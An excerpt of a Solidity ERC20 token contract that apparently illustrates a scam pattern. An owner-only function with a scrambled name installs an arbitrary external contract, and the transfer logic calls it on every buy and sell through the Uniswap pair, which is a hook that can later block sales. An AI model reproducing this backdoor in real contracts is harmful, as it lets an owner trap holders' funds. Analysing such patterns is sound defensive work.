...
contract TokenM is ERC20 {
    ...
    IUserAmountvoveer public voveer;
    ...
    function rodtbuosVndeesMfssr(IUserAmountvoveer _voveer) public onlyOwner {
        voveer = _voveer;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                voveer.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				voveer.addOutAmount(from, amount);
            }else{
                voveer.addOutAmount(from, amount);
                takeFee = false;
            }
